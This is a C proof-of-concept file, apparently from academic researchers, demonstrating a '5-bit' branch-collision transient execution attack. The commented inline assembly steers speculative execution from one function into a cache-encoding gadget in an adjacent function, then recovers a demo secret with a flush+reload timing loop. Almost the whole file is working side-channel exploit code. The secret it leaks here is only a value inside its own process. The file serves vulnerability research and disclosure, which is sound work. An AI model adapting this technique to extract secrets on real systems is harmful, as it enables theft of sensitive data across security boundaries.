/*********************************************************************
         "5-bit" collision transient execution attack PoC
This source code shows a Proof-of-Concept of "5-bit" collision transient 
attack.

For proof-of-concept we use a simple attack scenario: There are two functions,
f1 and f2 located next to each other. Function f1 operates with sensitive
data, which is loaded into registers in function prologue. The function does
not contain any leaking code, (including side-channel leakage) and can be
inspected. The function contains an indirect jump instruction. Function f2
operates with non-sensitive data and thus may contain code that leaks its
accessible variables through side channels. From architectural state point of
view no leakage of sensitive data is possible. However, due to branch
collision speculative execution with f2's body and context of f1 will happen
resulting in sensitive data leakage.

Contact:
    Dmitry Devtyushkin:   devtyushkin@wm.edu
    Tao Zhang:    tzhang06@email.wm.edu

June 2019, College of William & Mary
**********************************************************************/



#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

typedef unsigned long long u64;

#define PAGE_SIZE 4096
#define PAGE_ADDR(X) ((uint64_t)X &~ 0xfff)
#define CACHE_HIT_THRESHOLD 100 


__attribute__((always_inline)) inline void clflush(volatile void *p){
  asm volatile ("clflush (%0)" :: "r"(p));
  return;
}

__attribute__((always_inline)) inline uint64_t rdtsc(){
  unsigned int lo,hi;
  __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  return ((uint64_t)hi << 32) | lo;
}

__attribute__((always_inline)) inline uint64_t rdtscp(){
  unsigned int lo,hi;
  __asm__ __volatile__ ("rdtscp" : "=a" (lo), "=d" (hi));
  return ((uint64_t)hi << 32) | lo;
}

unsigned long long rdtscl(void){
  unsigned int lo, hi;
  __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
  return ( (unsigned long long)lo)|( ((unsigned long long)hi)<<32 );
}

void timing_analysis();

uint64_t *jump_target = &(uint64_t){0};
uint64_t uninteresting_data_0 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int *secret = &(int){42}; // secret

uint64_t uninteresting_data_1 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int *nonsecret = &(int){256}; // nonsecret 

register uint64_t r14 asm ("r14");
register uint64_t r13 asm ("r13"); 
register uint64_t r12 asm ("r12"); 

uint64_t uninteresting_data_2 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int user_dat [256*256] = {[0 ... 65279] = 7}; // user data

uint64_t uninteresting_data_3 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

unsigned n_run = 1;
int n_success = 0;
int n_measurements = 0;
char some_var;

/********************************************************************
Attack Code Layout
********************************************************************/
void stuffer(){
    asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
    asm("do_nothing:");
    asm("ret"); // this ret will be used by function (_f1).
}

// the assembly below simulates 2 simple functions, _f1 and _f2.
void f(){
  // "benign" function f1 performs transient attack via "5-bit" collision.
  // In regular control flow, it only executes an ind jump to ret.
  // Due to "5-bit" collision, before return, trainsient execution will take place 
  // in mispredicted target i.e <load_dat>.  Combining with the input, it 
  // reveals the secret via cache covert channel.
  asm("_f1:");
  asm("mov %0, %%r13"::"m"(secret));
  asm("mov %0, %%r12"::"m"(*jump_target)); 
  asm("mov (%r13), %r14"); // secret is in r14
  
  asm("jmp *%r12");
  asm("after_ind_jmp:");
  // space between reader branch and writer branch is adjustable by adding / removing nops below.
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");

  // in normal world function f2 leaks nonsecret data only
  asm("_f2:");
  asm("jmp load_dat");

  asm("after_d_jmp:");
  // nops in here to simulate other code
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");

  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  
  // this is cache covert channel aka spec gadget
  asm("load_dat:");
  some_var = user_dat[r14 * 256]; 

  asm("ret");
}


int main(int argc, char ** argv) {
  if(argc != 2){
    printf("Usage: ./PoC [# of true attack] (e.g. 1, 10, 100, etc.) \n");
    exit(1);
  }
  unsigned num_probe = atoi(argv[1]);
  
  printf(" --------------------Test Start-------------------- \n");
  printf("[sub-tests # ] cached_dat[position] = accessing time\n");

  /********************************************************************
  Test / Attack Code
  ********************************************************************/
  asm("lea do_nothing, %r9");
  asm("mov %%r9, %0"::"m"(*jump_target));

  // allow repetitive tests
  while(1){
    for(unsigned ir = 0; ir < 29000; ir++);  // artifical code 

    r14 = *nonsecret; // store non-secret value in r14    
    asm("call _f2"); // f2 leaks non-secret value
    
    // normal execution of non-related function
    asm("lea do_nothing, %r9;");
    asm("call *%r9;");

    asm("call _f2"); // execute f2 one more time
    // function f1 loads sensitive data into r14
    // and non-speculatively jmps to do nothing
    // speculative execution will jump to f2's body
    // causing leakage of sensitive data
    asm("call _f1"); 
    
    // timing analysis to retrieve the secret
    timing_analysis();
    if (n_success == num_probe) break;
    usleep(10);
  }


  // output the test summary
  uint64_t tracker_ind, tracker_d;
  asm("lea after_ind_jmp, %r14");
  asm("mov %%r14, %0"::"m"(tracker_ind));
  asm("lea after_d_jmp, %r14");
  asm("mov %%r14, %0"::"m"(tracker_d));

  printf(" --------------------config-------------------- \n");
  printf(" secret                     = 42 \n");
  printf("[tail] reader (ind.) branch = %p\n", (void *) tracker_ind-1);
  printf("[tail] writer (dir.) branch = %p\n", (void *) tracker_d-1);
  printf("[addr] secret @             = %p\n", (void *) secret);
  printf("[addr] nonsecret @          = %p\n", (void *) nonsecret);
  printf("[addr] jump_target @        = %p\n", (void *) jump_target);
  printf(" --------------------result-------------------- \n");
  printf("%d bytes were leaked in %d attempts with %d cache hits. Error rate is %f%%\n", 
    n_success, n_run - 1, n_measurements, (1 - (float)n_success / (n_measurements) ) * 100);
  
  return 0;
}  

/********************************************************************
Timing Analysis Code
********************************************************************/
void timing_analysis(){
  uint64_t t1,t2;
  uint64_t arr_timing[256];
  char z;
  int rand_i;
  for(int i=0; i<256; i++){
    rand_i = ((i * 167) + 13) & 255; // accessing every entry in random fashion
    t1 = rdtscp();
    z = user_dat[rand_i * 256];
    t2 = rdtscp();
    arr_timing[rand_i] = t2 - t1;
  }

  clflush(jump_target); 

  for(int i=0; i<256; i++){
    clflush(&user_dat[i * 256]);
  }

  printf("[sub-tests #%d] ",n_run++);

  for(int i=0; i<255; i++){
    if(arr_timing[i] < CACHE_HIT_THRESHOLD) {
      n_measurements++;
      printf("user_dat[%d] hit (%lu) cycles; ", i, arr_timing[i]);
      if (i == 42) n_success++;
    }
  }
  printf("\n");
  return;
}
